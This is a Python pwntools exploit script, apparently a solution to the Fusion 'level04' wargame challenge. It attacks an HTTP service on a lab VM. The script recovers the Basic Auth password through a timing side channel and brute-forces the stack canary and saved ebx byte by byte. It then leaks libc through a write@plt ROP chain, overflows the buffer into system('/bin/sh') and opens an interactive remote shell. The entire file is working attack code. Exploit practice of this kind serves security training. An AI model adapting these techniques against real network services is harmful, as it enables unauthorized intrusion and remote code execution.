

import argparse
import itertools
import time
import select
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument(
    '-p', '--password', action='store',
    dest='password',
    help='Already known password'

)
parser.add_argument(
    '-c', '--canary', action='store',
    dest='vc_sc',    #validate_credentials() stack canary
    help='Stack Canary for validate_credentials()'
)
parser.add_argument(
    '--ebx', action='store',
    dest='ebx',    # validate_credentials() stored ebx
    help='ebx stored in stack frame of validate_credentials()'
)
parser.add_argument(
    '-o', '--output', action='store',
    dest='output',    # validate_credentials() stored ebx
    help='Store results found'
)
args = parser.parse_args()

# stack canary
if args.vc_sc is not None:
    vc_sc = int(args.vc_sc, 0)  # 0-base in order to invoke prefix-guessing behavior
    assert(vc_sc >> 32 == 0)    # Stack canary is 32bit value
else:
    vc_sc = None

# ebx
if args.ebx is not None:
    ebx = int(args.ebx, 0)      # 0-base in order to invoke prefix-guessing behavior
    assert(ebx >> 32 == 0)    # ebx is 32bit value
else:
    ebx = None

password_len = 16

# usec (microseconds) that are used as password anti-brute forcing. The server will wait this amount*(total wrong password characters) 
# between 1. Finished checking the password and 2.responding back.
# If the password is correct, no delay is added by the server.
brute_force_threshold = 2500
def isValidPassword(pw):
    if len(pw) != password_len:
        return False
        
    for x in pw:
        val = ord(x)
        if not ( \
            (val >= ord('a') and val <= ord('z')) or    \
            (val >= ord('A') and val <= ord('Z')) or    \
            (val >= ord('0') and val <= ord('9'))       \
        ):
            return False

    return True

if args.password is not None:
    password = args.password
    if not isValidPassword(password):
        log.error("Invalid password. Must be " + str(password_len) + " Bytes long. Valid characters are a-z, A-Z, 0-9 (excluding all symbols)")
    log.info("Using already known password: " + password)
    passwordFound = True
else:
    password = ""
    passwordFound = False

context.endianness = 'little'
context.sign = False
context.word_size = 32
#context.log_level = logging.DEBUG

victim_ip = '192.168.59.128'
victim_port = 20004
vc_sc_padding = 0x7e7    # == 2023. Padding until we reach the stack canary

# Brute force password
if not passwordFound:
    def pwCharGenerator():
        r = itertools.chain(
            range(ord('a'), ord('z')+1),
            range(ord('A'), ord('Z')+1),
            range(ord('0'), ord('9')+1)
        )
        for value in r:
            yield chr(value)
    
    for i in range(0, password_len):  # Current index to brute force
        log.info("Brute forcing index: " + str(i))
        log.info("Current password found: " + password)

        generator = pwCharGenerator()

        # Incremental password building. This allows to have only 1 byte wrong and thus fixed 2500 microseconds delay
        password += 'a' # Just extend the string by 1 Byte. Value does not matter.
        warmups = 32 if i == 0 else 0   # Warmups in case this is the first character being brute-forced

        for pwChar in itertools.chain('@'*warmups, generator):
            # Disable logging to prevent spamming and increas speed
            prev_log_level = context.log_level
            context.log_level = logging.WARN
            conn = remote(victim_ip, victim_port)

            req  = 'GET /home/fusion/foo HTTP/1.1 \r\n'
            req += 'Host: ' + victim_ip + ':' + str(victim_port) + '\r\n'

            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization
            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#Basic_authentication_scheme
            # The "Basic" HTTP authentication scheme is defined in RFC 7617, which transmits credentials as user ID/password pairs, encoded using base64.
            # user ID and password are passed over the network as clear text (it is base64 encoded).
            # Syntax for Basic Authentication
            # Authorization: Basic <base64-result>
            # where <base64-result> == base64_encode("<username>:<passwrd>")
            password = password[:-1] + pwChar
            credentials = b'username:' + bytearray(password, encoding='utf-8') + b'\x00'
            req += 'Authorization: Basic ' + b64e(credentials) + '\r\n'
            req += '\r\n'

            # Create an epoll object to monitor for responses after the send operation
            epoll = select.epoll()
            epoll.register(conn.sock.fileno(), select.EPOLLIN | select.EPOLLPRI | select.EPOLLET)
            conn.send(bytearray(req, 'utf-8'))

            start = time.perf_counter()
            events = epoll.poll()   # blocking
            end = time.perf_counter()
            for fileno, _ in events:
                assert(fileno == conn.sock.fileno())

            d = conn.recvall().decode('ascii')
            conn.close()

            context.log_level = prev_log_level
            usec_elapsed = (end - start)*1000*1000
            if usec_elapsed < brute_force_threshold:
                log.info('polled for: ' + str(usec_elapsed) + ' usec')
                log.info('assuming password: ' + password)
                break
            else:
                log.debug('Attempted password: ' + password)
                log.debug('polled for: ' + str(usec_elapsed) + ' usec')

    assert(isValidPassword(password))
    log.success('Password found: ' + password)
    passwordFound = True

credentials = b'username:' + bytearray(password, encoding='utf-8')

# We are smashing the stack frame of validate_credentials(), by overflowing the buffer details.
if vc_sc is None:
    log.info("Brute-forcing stack canary of validate_credentials()")

    stack_canary_bytes = [0x00 for _ in range(4)]   # bytes stored in little endian order
    for i in range(0, 4): # 4 Bytes

        # "overwrite" variable represents the Bytes of the canary which will be overwritten 
        # We populate it first with the Bytes already found
        overwrite = [stack_canary_bytes[found_idx] for found_idx in range(i)]
        overwrite.append(0x00)  # Byte which will be calculated in the bellow loop
        for b in range(0, 256):
            log.debug('Attempting Byte ' + hex(b) + ' at index ' + str(i))

            prev_log_level = context.log_level  # Disable logging to prevent spamming and increase speed
            context.log_level = logging.WARN

            overwrite[i] = b
            overflown_credentials = bytearray(credentials + b'A'* vc_sc_padding) # padding until we reach the canary, which is located at $f2_ra-0x20 == $esp+0x83c
            overflown_credentials.extend(overwrite)

            conn = remote(victim_ip, victim_port)
            req  = 'GET /home/fusion/foo HTTP/1.1 \r\n'
            req += 'Host: ' + victim_ip + ':' + str(victim_port) + '\r\n'
            req += 'Authorization: Basic ' + b64e(overflown_credentials) + '\r\n'
            req += '\r\n'
            conn.send(bytearray(req, 'utf-8'))

            d = conn.recvall().decode('ascii')
            conn.close()
            
            context.log_level = prev_log_level
            if not d.startswith('*** stack smashing detected ***'):
                log.info('Found Byte: ' + hex(b) + ' at index ' + str(i))
                stack_canary_bytes[i] = b
                break
    stack_canary = bytearray(stack_canary_bytes)
    stack_canary = unpack(stack_canary)
    vc_sc = stack_canary
    log.success("Found Stack Canary: " + hex(vc_sc) + " for validate_credentials()")
else:
    log.info("Asumming Stack Canary: " + hex(vc_sc) + " for validate_credentials()")

# eip in 0x41414141
# Returned from validate_credentials()
# Registers:
# ebx == 0xb8000118. $ebx+0x1c == first entry of .got.plt == strcmp@got.plt
# esi == 0xbfff5a9c --> stack address. Points to "Authorization: Basic dXNlcm5hbWU6TTdTd0...\r\n"
# edi == 0xb7fcb884 --> stdin in section .data of /lib/i386-linux-gnu/libc.so.6. (b7fcb000-b7fcc000 rw-p 00178000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so (3rd page out of 3))

# Now that we have brute-forced the canary, let us brute-force ebx register
if ebx is None:
    log.info("Brute-forcing ebx register")
    ebx_bytes = [0x00 for _ in range(4)]
    for i in range(0, 4): # 4 Bytes

        # "overwrite" variable represents the Bytes of the ebx which will be overwritten 
        # We populate it first with the Bytes already found
        overwrite = [ebx_bytes[found_idx] for found_idx in range(i)]
        overwrite.append(0x00)  # Byte which will be calculated in the bellow loop
        for b in range(0, 256):
            log.debug('Attempting Byte ' + hex(b) + ' at index ' + str(i))

            prev_log_level = context.log_level  # Disable logging to prevent spamming and increase speed
            context.log_level = logging.WARN

            overwrite[i] = b
            overflown_credentials = bytearray(
                credentials         + 
                b'A'*vc_sc_padding  + # padding until we reach the canary, which is located at $f2_ra-0x20 == $esp+0x83c
                pack(vc_sc)         +
                b'B'*0x0c             # padding until we reach ebx
            )
            overflown_credentials.extend(overwrite) # ebx partial overwrite

            conn = remote(victim_ip, victim_port)
            req  = 'GET /././ HTTP/1.1 \r\n'    # Legitimate request that will print the contents of the directory "/opt/fusion/run"
            req += 'Host: ' + victim_ip + ':' + str(victim_port) + '\r\n'
            req += 'Authorization: Basic ' + b64e(overflown_credentials) + '\r\n'
            req += '\r\n'
            conn.send(bytearray(req, 'utf-8'))

            d = b''
            while True:
                partial_d = conn.recvrepeat(timeout=0.5)  # If after X seconds we have no response, then the server probably has entered in a loop due to our corrupted input
                d += partial_d
                if len(partial_d) == 0:
                    break
            d = d.decode('ascii')
            conn.close()
            
            # If we get wrong the ebx register, then the program will crash by calling fgets() in the next loop to read the final HTTP line "\r\n"
            context.log_level = prev_log_level
            if len(d) > 0 and d.startswith('HTTP/1.0 200 Ok\r\n'): # Program did not receive SIGSEGV since it did send a reply. ==> ebx was not corrupted.
                log.info('Found Byte: ' + hex(b) + ' at index ' + str(i))
                ebx_bytes[i] = b
                break
    ebx_bytes = bytearray(ebx_bytes)
    ebx = unpack(ebx_bytes)
    log.success("Found Value of regiser ebx: " + hex(ebx))  # 0xb8000100
else:
    log.info("Asumming regiser ebx == " + hex(ebx))

level04__base    = ebx - 0x4118
write__plt       = level04__base + 0xf30     # our leak primitive
strcmp__got_plt  = level04__base + 0x4134
strncmp__got_plt = level04__base + 0x4208    # will be used to leak libc base address

def leakPrimitive(addr, n):
    """
    Leaks n Bytes from the given address

    addr (int) - The address to leak from (32bit value)
    n (int) - The total Bytes to leak (32bit value)
    Retrun (bytes) - The leaked Bytes
    """
    assert(addr >> 32 == 0) # Must be 32bit value
    assert(n >> 32 == 0 and n > 0)

    conn = remote(victim_ip, victim_port)
    req = 'GET /././ HTTP/1.1 \r\n'
    req += 'Host: ' + victim_ip + ':' + str(victim_port) + '\r\n'
    overflown_credentials = (
        credentials         + 
        b'A'* vc_sc_padding + # padding until we reach the canary, which is located at $f2_ra-0x20 == $esp+0x83c
        pack(vc_sc)         +
        b'B'*0x0c           +
        pack(ebx)           + # ebx. Required to invoke library functions
        b'DDDD'             + # esi
        b'EEEE'             + # edi
        b'FFFF'             + # old ebp
        pack(write__plt)    + # ret addr of validate_credentials()
        (
            pack(0x00000000)    + # ret addr of write(). Just crash it.
            pack(0x01)          + # stdout fd
            pack(addr)          +
            pack(n)
        )
    ) 
    req += 'Authorization: Basic ' + b64e(overflown_credentials) + '\r\n'
    req += '\r\n'
    conn.send(bytearray(req, 'utf-8'))
    d = conn.recvall()
    conn.close()

    return d

log.info("Leaking libc address")
strncmp__libc = unpack(leakPrimitive(strncmp__got_plt, 4))
libc__base = strncmp__libc - 0x113ce0
log.success("Successfully leaked libc address: " + hex(libc__base))

libc__bin_sh = libc__base + 0x1388da
libc__system = libc__base + 0x03cb20

# Print the results
s = ""
s += '~~~ Brute-forced values ~~~\n'
s += 'Password    : ' + password       + '\n'
s += 'Stack Canary: ' + hex(vc_sc)     + '\n'
s += 'ebx         : ' + hex(ebx)       + '\n'
s += '------------------------------------\n'
s += '~~~ Derivative Values ~~~\n'
s += 'level04 base address : ' + hex(level04__base)    + '\n'
s += 'libc base address    : ' + hex(libc__base)       + '\n'
s += '\n'
s = s.splitlines()

log.info("Results:")
for line in s:
    log.info(line)

if args.output:
    log.info("Storing Results in " + args.output)
    with open(args.output, 'w') as out:
        out.writelines(s)

# pwn the system!
conn = remote(victim_ip, victim_port)
req = 'GET /././ HTTP/1.1 \r\n'
req += 'Host: ' + victim_ip + ':' + str(victim_port) + '\r\n'
overflown_credentials = (
    credentials         + 
    b'A'* vc_sc_padding + # padding until we reach the canary, which is located at $f2_ra-0x20 == $esp+0x83c
    pack(vc_sc)         +
    b'B'*0x0c           +
    pack(ebx)           + # ebx. Required to invoke library functions
    b'DDDD'             + # esi
    b'EEEE'             + # edi
    b'FFFF'             + # old ebp
    pack(libc__system)  + # ret addr of validate_credentials()
    (
        pack(0x00000000)    + # ret addr of system(). We will never return
        pack(libc__bin_sh)
    )
)
req += 'Authorization: Basic ' + b64e(overflown_credentials) + '\r\n'
req += '\r\n'
conn.send(bytearray(req, 'utf-8'))
conn.interactive()
conn.close()


# # Test request
# conn = remote(victim_ip, victim_port)
# req = 'GET /././ HTTP/1.1 \r\n'
# req += 'Host: ' + victim_ip + ':' + str(victim_port) + '\r\n'
# req += 'Authorization: Basic ' + b64e(credentials) + '\r\n'
# req += '\r\n'
# conn.send(bytearray(req, 'utf-8'))
# conn.recvall().decode('ascii')
# conn.close()
